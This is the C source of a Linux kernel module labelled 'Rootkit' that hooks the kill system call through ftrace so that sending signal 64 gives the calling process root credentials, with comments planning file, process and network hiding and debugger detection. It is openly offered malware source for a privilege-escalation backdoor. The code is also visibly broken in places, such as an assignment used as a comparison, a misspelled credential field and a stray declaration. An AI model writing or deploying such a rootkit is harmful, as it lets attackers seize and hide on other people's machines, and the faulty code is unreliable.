#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("otitoko");
MODULE_DESCRIPTION("Rootkit");
MODULE_VERSION("0.1");

//hide file
//hide network connections/ports
//hide processes
//gpu self healing
//debugger detection
//
asmlinkage long (*orig_kill)(pid_t pid, int sig);

void set_root(void){
	struct cred *root;

	root=prepare_creds();

	if(root==NULL)
		return;

	root->uid.val=root->gid.val=0;
	root->euid.val=root->egid.val=0;
	root->suid.val=root->sgid.val=0;
	root->fsuid.val=root->fdgid.val=0;

	commit_creds(root);
}

asmlinkage int hooked_kill(const struct pt_regs *regs){
	void set_root(void)

		int sig = regs->si;

	if(sig=64){
		printk(KERN_INFO "rootkit has gained root\n");
		set_root();
		return 0;
	}

	return orig_kill(regs);
}

static struct ftrace_hook hooks[]={
	HOOK("__x64_sys_kill", hooked_kill, &orig_kill).
};

static int __init basic_init(void){
	int err;
	err = fh_install_hooks(hooks,ARRAY_SIZE(hooks));
	if(err)
		return err;

	printk(KERN_INFO"rootkit loaded\n");

    return 0;
}

static void __exit basic_exit(void){
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO"rootkit unloaded\n");
}


module_init(basic_init);
module_exit(basic_exit);
